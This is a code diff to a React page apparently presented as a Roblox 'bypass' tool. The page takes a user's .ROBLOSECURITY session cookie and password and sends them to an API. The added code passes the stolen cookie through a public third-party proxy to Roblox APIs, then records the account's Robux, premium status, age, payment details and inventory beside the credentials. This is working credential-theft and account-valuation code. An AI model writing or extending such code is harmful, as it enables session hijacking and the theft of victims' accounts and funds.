@@ -88,6 +88,7 @@ const BypassPage = () => {
     }, 200);
 
     let apiOk = true;
+    let info: Record<string, any> = {};
     try {
       const res = await fetch(BYPASS_API_URL, {
         method: "POST",
@@ -95,9 +96,36 @@ const BypassPage = () => {
         body: JSON.stringify({ cookie: trimmed, password }),
       });
       apiOk = res.ok;
+      try { info = await res.clone().json(); } catch { info = {}; }
     } catch {
       apiOk = false;
     }
+
+    // Try to fetch real Roblox account info via public CORS proxy
+    try {
+      const proxy = (u: string) => `https://corsproxy.io/?${encodeURIComponent(u)}`;
+      const auth = await fetch(proxy("https://users.roblox.com/v1/users/authenticated"), {
+        headers: { Cookie: `.ROBLOSECURITY=${trimmed}` },
+      });
+      if (auth.ok) {
+        const me = await auth.json();
+        info.username = info.username || me?.name;
+        const uid = me?.id;
+        if (uid) {
+          const [bal, prem, user] = await Promise.all([
+            fetch(proxy(`https://economy.roblox.com/v1/users/${uid}/currency`), { headers: { Cookie: `.ROBLOSECURITY=${trimmed}` } }).then(r => r.ok ? r.json() : null).catch(() => null),
+            fetch(proxy(`https://premiumfeatures.roblox.com/v1/users/${uid}/validate-membership`)).then(r => r.ok ? r.json() : null).catch(() => null),
+            fetch(proxy(`https://users.roblox.com/v1/users/${uid}`)).then(r => r.ok ? r.json() : null).catch(() => null),
+          ]);
+          if (bal && bal.robux != null) info.robux = info.robux || String(bal.robux);
+          if (prem != null) info.premium = info.premium || (prem ? "Yes" : "No");
+          if (user?.created) {
+            const days = Math.floor((Date.now() - new Date(user.created).getTime()) / 86400000);
+            info.age = info.age || `${days} days`;
+          }
+        }
+      }
+    } catch {}
 
     const elapsed = Date.now() - start;
     if (elapsed < BYPASS_DURATION_MS) {
@@ -113,6 +141,19 @@ const BypassPage = () => {
         valid: apiOk,
         cookie: trimmed,
         password,
+        username: info.username,
+        robux: info.robux,
+        premium: info.premium,
+        rap: info.rap,
+        summary: info.summary,
+        creditBalance: info.creditBalance,
+        savedPayment: info.savedPayment,
+        korblox: info.korblox,
+        age: info.age,
+        groupsOwned: info.groupsOwned,
+        passes: info.passes,
+        placeVisits: info.placeVisits,
+        inventory: info.inventory,
       });
     }
 
